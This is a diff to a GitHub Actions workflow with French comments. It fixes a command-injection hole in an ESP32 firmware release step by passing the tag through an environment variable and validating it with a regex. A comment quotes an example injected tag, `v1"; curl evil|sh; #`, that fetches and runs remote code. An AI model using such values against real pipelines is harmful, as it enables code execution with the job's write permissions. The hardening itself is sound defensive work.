@@ -37,8 +37,19 @@ jobs:
         run: pip install --upgrade platformio "esptool<5"
 
       - name: Injecter la version (tag) dans le firmware
+        # Le tag passe par `env:` et non par une interpolation ${{ }} directement
+        # dans le script : interpolée, une valeur comme `v1"; curl evil|sh; #`
+        # serait exécutée par le shell avec les permissions contents:write du job.
+        # Via env, le shell ne voit qu'une variable, jamais du code.
+        env:
+          TAG: ${{ github.event.inputs.tag || github.ref_name }}
         run: |
-          TAG="${{ github.event.inputs.tag || github.ref_name }}"
+          set -euo pipefail
+          # Le tag finit dans un #define C : on n'accepte qu'un format de version strict.
+          if ! printf '%s' "$TAG" | grep -qE '^[A-Za-z0-9._-]+$'; then
+            echo "::error::Tag invalide (caractères autorisés : A-Z a-z 0-9 . _ -) : $TAG"
+            exit 1
+          fi
           sed -i "s/#define FIRMWARE_VERSION .*/#define FIRMWARE_VERSION \"${TAG}\"/" \
             Arduino/ESP32/Common/src/Version.hpp
           grep FIRMWARE_VERSION Arduino/ESP32/Common/src/Version.hpp
